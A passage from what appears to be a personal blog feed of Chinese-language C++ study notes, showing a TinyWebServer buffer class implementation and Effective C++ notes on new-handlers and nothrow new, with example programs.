class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">char</span>* <span class="title">BeginPtr_</span><span class="params">()</span></span>; </span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="type">char</span>*  <span class="title">BeginPtr_</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">MakeSpace_</span><span class="params">(<span class="type">size_t</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;<span class="type">char</span>&gt; buffer_;</span><br><span class="line">    std::atomic&lt;std::<span class="type">size_t</span>&gt; readPos_;</span><br><span class="line">    std::atomic&lt;std::<span class="type">size_t</span>&gt; writePos_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="buffer-c"><a href="#buffer-c" class="headerlink" title="buffer.c"></a>buffer.c</h3><p>在编写.cpp文件时：</p><ul><li><p>大部分函数声明 = </p><p>Buffer+作用域符(::) </p><p>{<br>看buffer构造图写代码；</p><p>}</p></li><li><p>记得<code>assert()</code></p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;buffer.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Buffer::<span class="built_in">Buffer</span>(<span class="type">int</span> InitBufferSize)</span><br><span class="line">    : <span class="built_in">buffer_</span>(InitBufferSize), <span class="built_in">readPos_</span>(<span class="number">0</span>), <span class="built_in">writePos_</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">Buffer::WritableBytes</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> buffer_.<span class="built_in">size</span>() - Buffer::writePos_;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">Buffer::ReadableBytes</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> writePos_ - readPos_;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">Buffer::PrependableBytes</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> readPos_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">Buffer::Peek</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">BeginPtr_</span>() + readPos_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Buffer::EnsureWriteable</span><span class="params">(<span class="type">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WritableBytes</span>() &lt; len)</span><br><span class="line">        <span class="built_in">MakeSpace_</span>(len);</span><br><span class="line">    <span class="comment">// 写下断言确保分配成功</span></span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">WritableBytes</span>() &gt;= len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Buffer::HasWritten</span><span class="params">(<span class="type">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    writePos_ = writePos_ + len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Buffer::Retrieve</span><span class="params">(<span class="type">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(len &lt;= <span class="built_in">ReadableBytes</span>());</span><br><span class="line">    readPos_ = readPos_ + len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Buffer::RetrieveUntil</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// assert(end -Peek() &lt;= ReadableBytes());  //原项目有这个，但是这里应该是不用的,因为我们可以判断可读和可写的具体数据在内存中的位置。</span></span><br><span class="line">    <span class="comment">// readPos_ += end -Peek();</span></span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">Peek</span>() &lt;= end);</span><br><span class="line">    <span class="built_in">Retrieve</span>(end - <span class="built_in">Peek</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Buffer::RetrieveAll</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// bzero(&amp;buffer_[0], buffer_.size());</span></span><br><span class="line">    readPos_ = writePos_ = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">Buffer::RetrieveAllToStr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// std::string str(Peek(), writePos_ - readPos_);</span></span><br><span class="line">    <span class="comment">//  readPos_ = writePos_ = 0;</span></span><br><span class="line">    <span class="function">std::string <span class="title">str</span><span class="params">(Peek(), ReadableBytes())</span></span>;</span><br><span class="line">    <span class="built_in">RetrieveAll</span>();</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">Buffer::BeginWriteConst</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">BeginPtr_</span>() + writePos_;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">Buffer::BeginWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">BeginPtr_</span>() + writePos_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Buffer::Append</span><span class="params">(<span class="type">const</span> std::string &amp;str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">Append</span>(str.<span class="built_in">data</span>(), str.<span class="built_in">length</span>());</span><br><span class="line">    <span class="comment">// c_str() 函数返回的指针可以确保指向以 null 结尾的字符串，适用于传递给需要以 C 风格字符串为参数的函数，而 data() 函数返回的指针可能不以 null 结尾，适用于需要访问字符串数据但不需要 null 结尾的场景。</span></span><br><span class="line">    <span class="comment">// 一般来说data() 比 c_str() 更快，因为data()不需要创建副本，在buffer这种追求性能的场景中，我们使用data();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Buffer::Append</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(str);</span><br><span class="line">    <span class="built_in">EnsureWriteable</span>(len);</span><br><span class="line">    std::<span class="built_in">copy</span>(str, str + len, <span class="built_in">BeginWrite</span>());</span><br><span class="line">    <span class="built_in">HasWritten</span>(len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Buffer::Append</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// std::copy(static_cast&lt;const char *&gt;(data),Peek(), len);</span></span><br><span class="line">    <span class="comment">//  HasWritten(len);</span></span><br><span class="line">    <span class="built_in">assert</span>(data);</span><br><span class="line">    <span class="built_in">Append</span>(<span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">char</span> *&gt;(data), len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Buffer::Append</span><span class="params">(<span class="type">const</span> Buffer &amp;buff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// std::copy(buff.Peek() + readPos_,Peek(),buff.writePos_ - buff.readPos_);</span></span><br><span class="line">    <span class="comment">// HasWritten(buff.writePos_ - buff.readPos_);</span></span><br><span class="line">    <span class="built_in">Append</span>(buff.<span class="built_in">Peek</span>(), buff.<span class="built_in">ReadableBytes</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">Buffer::ReadFd</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> *SaveErrno)</span> <span class="comment">// 从socket读取数据</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">65535</span>];</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">iovec</span> iov[<span class="number">2</span>]; <span class="comment">// iovec 是一个在 POSIX 兼容系统中的结构体，用于在一次系统调用中读写多个非连续的内存区域。</span></span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> writable = <span class="built_in">WritableBytes</span>();</span><br><span class="line">    iov[<span class="number">0</span>].iov_base = <span class="built_in">BeginPtr_</span>() + writePos_;</span><br><span class="line">    iov[<span class="number">0</span>].iov_len = writable;</span><br><span class="line">    iov[<span class="number">1</span>].iov_base = &amp;buff;</span><br><span class="line">    iov[<span class="number">1</span>].iov_len = <span class="built_in">sizeof</span>(buff);</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">ssize_t</span> len = <span class="built_in">readv</span>(fd, iov, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *SaveErrno = errno; <span class="comment">// 保存错误码，防止错误码被覆盖</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">static_cast</span>&lt;<span class="type">size_t</span>&gt;(len) &lt;= writable)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">HasWritten</span>(len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        writePos_ = buffer_.<span class="built_in">size</span>();</span><br><span class="line">        Buffer::<span class="built_in">Append</span>(buff, len - writable);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">Buffer::WriteFd</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> *SaveErrno)</span> <span class="comment">// 写入数据socket</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ssize_t</span> len = <span class="built_in">write</span>(fd, <span class="built_in">Peek</span>(), <span class="built_in">ReadableBytes</span>());</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *SaveErrno = errno; <span class="comment">// 保存错误码，防止错误码被覆盖</span></span><br><span class="line">        <span class="keyword">return</span> len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Retrieve</span>(len);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">Buffer::BeginPtr_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;*buffer_.<span class="built_in">begin</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">Buffer::BeginPtr_</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;*buffer_.<span class="built_in">begin</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Buffer::MakeSpace_</span><span class="params">(<span class="type">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 分为移动readable数据能找到空闲空间和一定需要分配空间两种情况</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WritableBytes</span>() + <span class="built_in">PrependableBytes</span>() &lt; len)</span><br><span class="line">    &#123;</span><br><span class="line">        buffer_.<span class="built_in">resize</span>(writePos_ + len + <span class="number">1</span>); <span class="comment">// vector从0开始，要＋1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> readable = <span class="built_in">ReadableBytes</span>();</span><br><span class="line">        std::<span class="built_in">copy</span>(<span class="built_in">Peek</span>(), <span class="built_in">Peek</span>() + readable, <span class="built_in">BeginPtr_</span>());</span><br><span class="line">        readPos_ = <span class="number">0</span>;</span><br><span class="line">        writePos_ = readPos_ + readable;</span><br><span class="line">        <span class="built_in">assert</span>(readable == <span class="built_in">ReadableBytes</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// std::vector&lt;char&gt; buffer_;</span></span><br><span class="line"><span class="comment">// std::atomic&lt;std::size_t&gt; readPos_;</span></span><br><span class="line"><span class="comment">// std::atomic&lt;std::size_t&gt; writePos_;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> TinyWebServer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> TinyWebServer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EffectiveCpp0x6</title>
      <link href="/2024/04/28/C&amp;C++/Effective%20Cpp0x8/"/>
      <url>/2024/04/28/C&amp;C++/Effective%20Cpp0x8/</url>
      
        <content type="html"><![CDATA[<h1 id="Customizing-new-and-delete"><a href="#Customizing-new-and-delete" class="headerlink" title="Customizing new and delete"></a>Customizing new and delete</h1><p>[toc]</p><h3 id="Understande-the-behavior-of-the-new-handler"><a href="#Understande-the-behavior-of-the-new-handler" class="headerlink" title="Understande the behavior of the new-handler."></a>Understande the behavior of the new-handler.</h3><p>当operator new无法满足内存分配需求时，会抛出异常，用户可以通过调用<code>set_new_handler</code>来设置异常处理函数。</p><p><code>MSVC</code>声明：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_EXPORT_STD <span class="keyword">using</span> new_handler = <span class="built_in">void</span>(__CLRCALL_PURE_OR_CDECL*)();</span><br><span class="line">_EXPORT_STD <span class="keyword">extern</span> <span class="string">&quot;C++&quot;</span> <span class="function">_CRTIMP2 new_handler __cdecl <span class="title">set_new_handler</span><span class="params">(_In_opt_ new_handler)</span> <span class="keyword">noexcept</span></span>;</span><br></pre></td></tr></table></figure><p>这段代码定义了<code>new_handler</code>类型为函数指针，并声明了<code>set_new_handler</code>函数，<code>noexcept</code>，表示不抛出异常</p><p><code>set_new_handler</code>的<code>参数是个指针</code>，指向<code>operator new</code>无法分配足够内存时该被调用的函数。其<code>返回值也是个指针</code>，指向set_new_handler 被调用前正在执行（但<code>马上就要被替换</code>）的那个new-handler 函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;new&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_new_handler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cerr &lt;&lt; <span class="string">&quot;Memory allocation failed. Exiting program.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::<span class="built_in">set_new_handler</span>(my_new_handler);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span>* p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10000000</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">catch</span> (<span class="type">const</span> std::bad_alloc&amp; e) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;Caught bad alloc: &quot;</span> &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cin.<span class="built_in">get</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//最后一行输出Memory allocation failed. Exiting program.  ，并没有调用catch语句</span></span><br><span class="line"><span class="comment">//在x64模式下，能分配1000多次</span></span><br></pre></td></tr></table></figure><ul><li>若不调用std::abort()，则程序将陷入死循环。即 不断调用new-handler函数，直到找到足够内存。</li></ul><blockquote><p>如果在写出错误信息至cerr 过程期间必须动态分配内存，考虑会发生什么事……）</p><p>如果在自定义的 <code>new_handler</code> 中尝试动态分配内存，而此时系统已经处于内存不足的状态，那么这个分配操作很可能会失败，从而再次触发 <code>new_handler</code>。这将导致一个递归调用链，可能会迅速耗尽栈空间，导致栈溢出，最终程序会崩溃。</p><p>为了避免这种情况，自定义的 <code>new_handler</code> 应该避免进行任何可能导致内存分配的操作，包括：</p><ul><li>创建新的对象（除非它们非常小并且可以分配在栈上）</li><li>调用可能分配内存的函数（例如，某些 I/O 操作或字符串处理函数）</li><li>抛出异常（因为异常处理需要分配内存来处理栈展开）</li></ul><p>自定义的 <code>new_handler</code> 的主要目的是提供一个恢复机制，比如释放一些不必要的内存，或者尝试调整程序的状态以减少内存需求。如果无法恢复，处理函数应该以一种安全的方式终止程序，例如调用 <code>std::abort()</code> 或 <code>std::exit()</code>。</p></blockquote><p>那么，一个设计良好的0handler处理函数必须做以下事情：</p><ul><li><code>让更多内存可被使用</code>：实现此策略的一个做法是，程序一开始执行就为new-handler 分配一大块内存，而后当new-handler 第一次被调用，将它们释还给程序使用。</li><li><code>安装另一个new-handler</code>：这个旋律的变奏之一是让new-handler 修改自己的行为，于是当它下次被调用，就会做某些不同的事。为达此目的，做法之一是令new-handler 修改“会影响new-handler 行为＂的static 数据、namespace 数据或global 数据。</li><li><code>卸除new-handler</code>：将<code>nullptr</code>传给set new handler 。一旦没有安装任何new-handler, operator new 会在内存分配不成功时抛出异常。</li><li><code>抛出bad_alloc(或派生自bad_alloc)的异常</code>：这样的异常不会被operator new 捕捉，因此会被<code>传播</code>到内存索求处。</li><li><code>不返回</code>：调用 <code>std::abort()</code> 或 <code>std::exit()</code>。</li></ul><h4 id="类专属new-handlers"><a href="#类专属new-handlers" class="headerlink" title="类专属new-handlers"></a>类专属new-handlers</h4><p>//TODO</p><p>在C++11，我们可以这样写：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;new&gt;</span> <span class="comment">// 用于 std::set_new_handler 和 std::new_handler</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 自定义 new_handler</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">customNewHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Memory allocation failed for MyClass. Custom new handler invoked.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="comment">// 可以在这里尝试释放一些内存、调整程序状态或记录日志</span></span><br><span class="line">        <span class="comment">// 如果无法恢复，可能需要终止程序</span></span><br><span class="line">        std::<span class="built_in">abort</span>(); <span class="comment">// 终止程序</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写 operator new</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="type">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 设置专属的 new_handler</span></span><br><span class="line">        std::new_handler prevHandler = std::<span class="built_in">set_new_handler</span>(customNewHandler);</span><br><span class="line">        <span class="type">void</span>* ptr = ::<span class="keyword">operator</span> <span class="built_in">new</span>(size); <span class="comment">// 调用全局 new</span></span><br><span class="line">        <span class="comment">// 恢复之前的 new_handler</span></span><br><span class="line">        std::<span class="built_in">set_new_handler</span>(prevHandler);</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写 operator new[]</span></span><br><span class="line">    <span class="type">static</span> <span class="type">void</span>* <span class="keyword">operator</span> <span class="keyword">new</span>[](std::<span class="type">size_t</span> size) <span class="built_in">throw</span>(std::bad_alloc) &#123;</span><br><span class="line">        <span class="comment">// 设置专属的 new_handler</span></span><br><span class="line">        std::new_handler prevHandler = std::<span class="built_in">set_new_handler</span>(customNewHandler);</span><br><span class="line">        <span class="type">void</span>* ptr = ::<span class="keyword">operator</span> <span class="keyword">new</span>[](size); <span class="comment">// 调用全局 new[]</span></span><br><span class="line">        <span class="comment">// 恢复之前的 new_handler</span></span><br><span class="line">        std::<span class="built_in">set_new_handler</span>(prevHandler);</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        MyClass* obj = <span class="keyword">new</span> MyClass[<span class="number">1000000000</span>];</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Memory allocated successfully for MyClass.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">const</span> std::bad_alloc&amp; e) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Caught bad alloc: &quot;</span> &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 程序的其他部分...</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Memory allocated successfully for MyClass.</span></span><br><span class="line"><span class="comment">//Memory allocation failed for MyClass. Custom new handler invoked.</span></span><br></pre></td></tr></table></figure><p>可以看到我们可以通过重写new操作符来实现类专属new-handlers。</p><h4 id="nothrow-new"><a href="#nothrow-new" class="headerlink" title="nothrow new"></a>nothrow new</h4><p>Nothrownew 对异常的强制保证性并不高。要知道，表达式<code>new (std: :nothrow)widget</code>，发生两件事，第一， <code>nothrow 版的operator new 被调用</code>，如果分配成功。<code>Widget构造函数</code>可以做它想做的任何事。它<code>有可能又new 一些内存</code>，而没人可以强迫它再次使用nothrow new 。因此虽然”new (std: :nothrow) Widget” 调用的operator new 并不抛掷异常，但Widget构造函数却可能会。如果它真那么做，该异常会一如往常地传播。</p><h4 id="请记住"><a href="#请记住" class="headerlink" title="请记住"></a>请记住</h4><ul><li>set<em> new</em> handler 允许客户指定一个函数，在内存分配无法获得满足时被调用。</li><li>Nothrow new 是一个颇为局限的工具，因为它只适用于内存分配；后继的构造函数调用还是可能抛出异常。</li></ul><h3 id="Understand-when-it-makes-sense-to-replace-new-and-delete"><a 